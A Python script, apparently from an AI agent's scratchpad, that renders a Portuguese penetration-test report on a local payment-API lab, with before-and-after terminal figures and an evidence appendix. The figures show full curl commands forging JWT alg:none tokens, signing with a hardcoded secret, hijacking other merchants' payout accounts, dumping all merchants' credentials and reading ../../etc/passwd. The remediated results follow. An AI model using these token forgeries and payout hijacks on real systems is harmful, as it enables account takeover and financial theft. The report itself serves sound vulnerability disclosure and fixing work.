# -*- coding: utf-8 -*-
import html, re, pathlib

OUT = pathlib.Path("/tmp/claude-0/-home-user-securityclaude/286a1aba-26e1-5ba7-85b9-680fb8f38bc1/scratchpad/pdf2/report.html")

def esc(s): return html.escape(s, quote=False)

def card(title, body, shell="zsh"):
    """Render a terminal card. body = list of raw lines."""
    out = []
    for ln in body:
        e = esc(ln)
        st = ln.strip()
        if st.startswith("#"):
            e = f'<span class="cm">{e}</span>'
        elif ln.startswith("HTTP/"):
            m = re.search(r"HTTP/\S+\s+(\d{3})", ln)
            cls = "ok" if (m and m.group(1)[0]=="2") else "err"
            e = f'<span class="st {cls}">{e}</span>'
        else:
            # colore o prompt enzo@kali:...$
            mm = re.match(r"^(\s*)(enzo@kali:[^$]*\$)(.*)$", ln)
            if mm:
                e = f'{mm.group(1)}<span class="pr">{esc(mm.group(2))}</span>{esc(mm.group(3))}'
        out.append(e)
    joined = "\n".join(out)
    return (f'<div class="term"><div class="bar"><span class="dots"><i></i><i></i><i></i></span>'
            f'<span class="ttl">{esc(title)}</span><span class="sh">{esc(shell)}</span></div>'
            f'<pre class="body">{joined}</pre></div>')

def fig(n, title, body, caption, shell="zsh"):
    return f'<figure>{card(title, body, shell)}<figcaption>Figura {n}. {esc(caption)}</figcaption></figure>'

# ---------------- FIGURAS (conteudo real capturado) ----------------
F = {}
F[1] = fig(1, "JWT alg:none: forja de identidade sem segredo", [
 "# token forjado: header {\"alg\":\"none\"}, payload {\"sub\":\"m_0093\"}, SEM assinatura",
 "enzo@kali:~/arara-lab$ FORGED='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJtXzAwOTMifQ.'",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_0093 -H \"Authorization: Bearer $FORGED\"",
 "HTTP/1.1 200 OK",
 "{",
 '  "id": "m_0093", "nome": "Curso Viver de Renda LTDA",',
 '  "email": "financeiro@viverderenda.com",',
 '  "senha": "arara123", "api_key": "sk_live_m0093_8f2a1c",',
 '  "webhook_secret": "whsec_plataforma_unico",',
 '  "payout_banco": "237", "payout_agencia": "0001", "payout_conta": "12345-6",',
 '  "saldo_centavos": 4820000',
 "}",
], "Token forjado com alg:none lê o cadastro completo do m_0093, sem senha e sem segredo.")

F[2] = fig(2, "Cadeia alg:none + BOLA: takeover sem conta", [
 "# atacante NAO tem login. token forjado alg:none com sub arbitrario ('anon')",
 "enzo@kali:~/arara-lab$ FORGED_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbm9uIn0.'",
 "# [antes] conta de recebimento do m_4821:  341 / 2020 / 98765-4",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3000/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $FORGED_NONE\" \\",
 "     -d '{\"merchant_id\":\"m_4821\",\"banco\":\"001\",\"agencia\":\"0001\",\"conta\":\"13337-0\",\"cpf_cnpj\":\"00000000000000\",\"notify\":false}'",
 "HTTP/1.1 201 Created",
 "# [depois] conta de recebimento do m_4821, redirecionada sem nenhuma credencial:",
 "    banco=001  ag=0001  conta=13337-0",
], "Cadeia alg:none + BOLA. Uma requisição anônima redireciona o recebimento do m_4821.")

F[3] = fig(3, "Segredo do JWT fixo no código (arara-2024)", [
 "# assinamos um HS256 valido usando o segredo lido direto de src/auth.ts",
 "enzo@kali:~/arara-lab$ SIGNED=$(jwt-sign --secret 'arara-2024' --sub m_5117)",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_5117 -H \"Authorization: Bearer $SIGNED\"",
 "HTTP/1.1 200 OK",
 '{ "id": "m_5117", "nome": "Ebook Emagrecimento Real",',
 '  "api_key": "sk_live_m5117_c1d4f0", "senha": "mudar123", ... }',
 "# o servidor tratou como legitimo um token que NOS assinamos",
], "Token HS256 assinado pelo atacante com o segredo arara-2024 e aceito como legítimo.")

F[4] = fig(4, "BOLA: trocar a conta de recebimento de outro lojista", [
 "# atacante = m_4821 (token proprio).   alvo = m_0093 (saldo R$ 48.200,00)",
 "# [antes] conta de payout do m_0093:  237 / 0001 / 12345-6",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3000/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" \\",
 "     -d '{\"merchant_id\":\"m_0093\",\"banco\":\"999\",\"agencia\":\"6666\",\"conta\":\"00000-0\",\"cpf_cnpj\":\"00000000000000\",\"notify\":false}'",
 "HTTP/1.1 201 Created",
 "# [depois] conta de payout do m_0093, trocada e persistida:",
 "    banco=999  ag=6666  conta=00000-0  cnpj=00000000000000",
], "Payout do m_0093 trocado com o token do m_4821. HTTP 201 e valor persistido (999/6666/00000-0).")

F[5] = fig(5, "IDOR: qualquer token lê qualquer cadastro", [
 "# token LEGITIMO do m_4821 lendo o cadastro do m_5117 (outro dono)",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_5117 -H \"Authorization: Bearer $TOKEN_m4821\"",
 "HTTP/1.1 200 OK",
 "{",
 '  "id": "m_5117", "nome": "Ebook Emagrecimento Real",',
 '  "email": "adm@emagrecimentoreal.com",',
 '  "senha": "mudar123", "api_key": "sk_live_m5117_c1d4f0",',
 '  "webhook_secret": "whsec_plataforma_unico",',
 '  "payout_banco": "260", "payout_agencia": "0001", "payout_conta": "55555-5",',
 '  "saldo_centavos": 1870000',
 "}",
], "Token do m_4821 lendo o cadastro de outro lojista (IDOR).")

F[6] = fig(6, "Enumeração em massa: dump de credenciais de todos", [
 "# loop forjando alg:none para cada id e extraindo os segredos",
 "enzo@kali:~/arara-lab$ for id in m_0093 m_4821 m_5117; do \\",
 "     curl -s $B/v1/merchants/$id -H \"Authorization: Bearer $(forge_none $id)\"; \\",
 "  done | jq -r '[.id,.senha,.api_key,.webhook_secret] | @tsv'",
 "m_0093   arara123    sk_live_m0093_8f2a1c   whsec_plataforma_unico",
 "m_4821   senha2024   sk_live_m4821_3b9e7d   whsec_plataforma_unico",
 "m_5117   mudar123    sk_live_m5117_c1d4f0   whsec_plataforma_unico",
], "Enumeração da base inteira: senha, api_key e webhook_secret de todos os lojistas.")

F[7] = fig(7, "Autenticação: token sem expiração", [
 "# login legitimo do lojista m_4821",
 "enzo@kali:~/arara-lab$ TOKEN=$(curl -s -X POST localhost:3000/v1/auth/login \\",
 "     -d '{\"email\":\"contato@alphatrader.com\",\"senha\":\"senha2024\"}' | jq -r .token)",
 "# decodificando o payload (base64). repare: NAO ha campo exp",
 "enzo@kali:~/arara-lab$ echo $TOKEN | cut -d. -f2 | base64 -d",
 '{"sub":"m_4821","iat":1791405186}',
], "Payload do token legítimo. Não existe campo exp.")

F[8] = fig(8, "ignoreExpiration: token vencido (exp em 2023) é aceito", [
 "# token com exp em novembro de 2023, anos no passado",
 "enzo@kali:~/arara-lab$ echo $EXPIRADO | cut -d. -f2 | base64 -d",
 '{"sub":"m_5117","iat":1700000000,"exp":1700003600}',
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3000/v1/merchants/m_5117 -H \"Authorization: Bearer $EXPIRADO\"",
 "HTTP/1.1 200 OK",
 "# aceito normalmente: a verificacao passa ignoreExpiration:true",
], "Token com exp em 2023 aceito do mesmo jeito.")

F[9] = fig(9, "Token vazando no log (debug para CloudWatch)", [
 "# linha gerada pelo endpoint de relatorio: Bearer inteiro em texto",
 "enzo@kali:~/arara-lab$ grep 'conciliacao auth=' server.log | tail -1",
 "[Nest] 947  - 10/07/2026, 8:33:06 PM   DEBUG [reports] conciliacao auth=Bearer",
 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTE0MDUxODZ9.cvJbfjbHQjt0YC2oqC-mz1dkx4T_tABy7UqMlzBPhvY params={\"arquivo\":\"out.csv\"}",
], "Bearer inteiro gravado no log do servidor (o payload decodifica para sub=m_4821).", shell="log")

F[10] = fig(10, "Path traversal no relatório de conciliação", [
 "enzo@kali:~/arara-lab$ curl -s -i -G localhost:3000/v1/reports/conciliacao \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" \\",
 "     --data-urlencode 'arquivo=../../../../etc/passwd'",
 "HTTP/1.1 200 OK",
 "{",
 '  "merchant": "m_4821",',
 '  "download_url": "https://arara-conciliacao.s3.amazonaws.com/relatorios/../../../../etc/passwd",',
 '  "arquivo": "relatorios/../../../../etc/passwd"',
 "}",
], "O ../ escapa do prefixo de relatórios na URL gerada.")

# ------- depois (lab corrigido, porta 3001) -------
F[11] = fig(11, "Depois: BOLA bloqueado (dono vem do token)", [
 "# m_4821 (token legitimo) tentando trocar a conta do m_0093",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3001/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" -d '{\"merchant_id\":\"m_0093\", ...}'",
 "HTTP/1.1 403 Forbidden",
 '{"message":"nao autorizado a alterar outro lojista","error":"Forbidden","statusCode":403}',
 "# sub do token != merchant_id do corpo -> recusado",
], "Depois: BOLA bloqueado (403). O dono passa a vir do token.")

F[12] = fig(12, "Depois: alg:none recusado", [
 "# mesmo token forjado alg:none do ataque original",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3001/v1/merchants/m_0093 -H \"Authorization: Bearer $FORGED_NONE\"",
 "HTTP/1.1 401 Unauthorized",
 '{"message":"token invalido","error":"Unauthorized","statusCode":401}',
 "# jwt.verify com algorithms:['HS256'] rejeita o 'none' (e a excecao vira 401, nao 500)",
], "Depois: token alg:none rejeitado (401).")

F[13] = fig(13, "Depois: leitura cruzada bloqueada + resposta sem segredos", [
 "# m_4821 tentando ler o cadastro do m_5117 (outro dono)",
 "enzo@kali:~/arara-lab$ curl -s -i localhost:3001/v1/merchants/m_5117 -H \"Authorization: Bearer $TOKEN_m4821\"",
 "HTTP/1.1 403 Forbidden",
 "# lendo o PROPRIO cadastro: DTO mascarado, sem senha/api_key/webhook_secret",
 "enzo@kali:~/arara-lab$ curl -s localhost:3001/v1/merchants/m_4821 -H \"Authorization: Bearer $TOKEN_m4821\"",
 '{"id":"m_4821","nome":"Mentoria Alpha Trader","email":"contato@alphatrader.com",',
 ' "payout_banco":"341","payout_agencia":"2020","payout_conta":"****-4","saldo_centavos":9610000}',
], "Depois: IDOR bloqueado e resposta via DTO, sem senha, api_key ou webhook_secret.")

F[14] = fig(14, "Depois: path traversal rejeitado", [
 "# mesma tentativa de ../ no parametro",
 "enzo@kali:~/arara-lab$ curl -s -i -G localhost:3001/v1/reports/conciliacao \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" --data-urlencode 'arquivo=../../../etc/passwd'",
 "HTTP/1.1 400 Bad Request",
 '{"message":"referencia de relatorio invalida","error":"Bad Request","statusCode":400}',
 "# fora do formato [A-Za-z0-9_-] -> 400",
], "Depois: path traversal rejeitado (400).")

F[15] = fig(15, "Depois: fluxo legítimo continua funcionando", [
 "# m_4821 trocando a PROPRIA conta (merchant_id == sub) com segundo fator",
 "enzo@kali:~/arara-lab$ curl -s -i -X POST localhost:3001/v1/merchants/payout-account \\",
 "     -H \"Authorization: Bearer $TOKEN_m4821\" \\",
 "     -d '{\"merchant_id\":\"m_4821\",\"banco\":\"341\",\"agencia\":\"2020\",\"conta\":\"98765-4\",\"cpf_cnpj\":\"44555666000199\",\"step_up_ok\":true}'",
 "HTTP/1.1 201 Created",
 '{"ok":true,"merchant":{"id":"m_4821","nome":"Mentoria Alpha Trader","payout_conta":"****-4","saldo_centavos":9610000}}',
 "# quem integra de boa nao quebra: so muda a propria conta",
], "Depois: o lojista troca a própria conta normalmente (201). A correção não quebra quem já integra.")

# ---------------- ANEXO A (transcricao real) ----------------
ANEXO = """================================================================
APENDICE DE EVIDENCIAS - execucao real contra http://localhost:3000
Lab arara-lab (banco em memoria, estado inicial a cada start).
Captura unica; as figuras do corpo reproduzem estas mesmas saidas.
================================================================

[E0] LOGIN legitimo do atacante (m_4821)
$ curl -s -X POST localhost:3000/v1/auth/login \\
    -d '{"email":"contato@alphatrader.com","senha":"senha2024"}'
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTE0MDUxODZ9.cvJbfjbHQjt0YC2oqC-mz1dkx4T_tABy7UqMlzBPhvY"}
# payload (sem campo exp): {"sub":"m_4821","iat":1791405186}

[E1] alg:none le o cadastro do m_0093 (estado original)
$ curl -s localhost:3000/v1/merchants/m_0093 -H 'Authorization: Bearer <alg:none sub=m_0093>'
 id=m_0093 senha=arara123 api_key=sk_live_m0093_8f2a1c whsec=whsec_plataforma_unico
 payout=237/0001/12345-6  saldo=4820000

[E2] IDOR: token do m_4821 le o cadastro do m_5117
 id=m_5117 senha=mudar123 api_key=sk_live_m5117_c1d4f0 payout=260/0001/55555-5

[E3] Enumeracao em massa (alg:none por id)
 m_0093 | arara123  | sk_live_m0093_8f2a1c | whsec_plataforma_unico
 m_4821 | senha2024 | sk_live_m4821_3b9e7d | whsec_plataforma_unico
 m_5117 | mudar123  | sk_live_m5117_c1d4f0 | whsec_plataforma_unico

[E4] Segredo fixo arara-2024 aceito / segredo errado rejeitado
 token assinado com 'arara-2024'  -> HTTP 200
 token assinado com segredo errado -> HTTP 500   (excecao nao tratada; ver M1)

[E5] Token expirado (exp em 2023) aceito
 exp: {"sub":"m_5117","iat":1700000000,"exp":1700003600}  -> HTTP 200

[E6] BOLA: m_4821 troca o payout do m_0093
 [antes] 237/0001/12345-6  ->  HTTP 201  ->  [depois] 999/6666/00000-0

[E7] Cadeia alg:none + BOLA (requisicao anonima) troca o payout do m_4821
 [antes] 341/2020/98765-4  ->  HTTP 201  ->  [depois] 001/0001/13337-0

[E8] Path traversal no relatorio
 arquivo=../../../../etc/passwd
 download_url = https://arara-conciliacao.s3.amazonaws.com/relatorios/../../../../etc/passwd

[E9] Token inteiro no log do servidor (nivel DEBUG)
 [Nest] 947  - 10/07/2026, 8:33:06 PM   DEBUG [reports] conciliacao auth=Bearer
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtXzQ4MjEiLCJpYXQiOjE3OTE0MDUxODZ9.cvJbfjbHQjt0YC2oqC-mz1dkx4T_tABy7UqMlzBPhvY params={"arquivo":"out.csv"}
"""

# ---------------- montagem do HTML ----------------
# (o corpo em prosa vem do arquivo template abaixo, com placeholders {F1}.. e {ANEXO})
TPL = pathlib.Path("/tmp/claude-0/-home-user-securityclaude/286a1aba-26e1-5ba7-85b9-680fb8f38bc1/scratchpad/pdf2/body.html").read_text(encoding="utf-8")
body = TPL
for i in range(1,16):
    body = body.replace("{F%d}"%i, F[i])
body = body.replace("{ANEXO}", "<pre class=\"evid\">"+esc(ANEXO)+"</pre>")
OUT.write_text(body, encoding="utf-8")
leftover = re.findall(r"\{F?\d+\}|\{ANEXO\}", body)
print("placeholders restantes:", leftover)
print("tamanho:", round(len(body)/1024,1), "KB")
